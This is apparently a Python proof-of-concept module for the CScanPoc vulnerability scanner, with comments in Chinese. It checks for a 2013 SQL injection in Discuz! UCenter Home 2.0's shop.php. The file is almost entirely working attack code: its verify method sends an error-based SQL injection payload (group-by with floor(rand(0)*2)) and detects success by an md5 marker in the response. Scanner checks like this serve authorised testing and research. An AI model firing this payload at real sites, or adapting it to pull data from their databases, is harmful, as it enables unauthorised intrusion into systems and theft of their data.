# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Discuz_0016' # 平台漏洞编号，留空
    name = 'Discuz! UCenter Home 2.0 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-12-9'  # 漏洞公布时间
    desc = '''
        discuz UCenter Home 2.0 SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'http://www.discuz.net/thread-3490557-1-1.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Discuz UCenter Home 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '217a1a73-ee32-423e-bc9c-0d1509cf6ae0'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "shop.php?ac=view&shopid=253 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(hex(md5(3.1415))),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
            url = arg + payload
            code, head, res, errcode, _ = hh.http('"%s"' % url)
            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()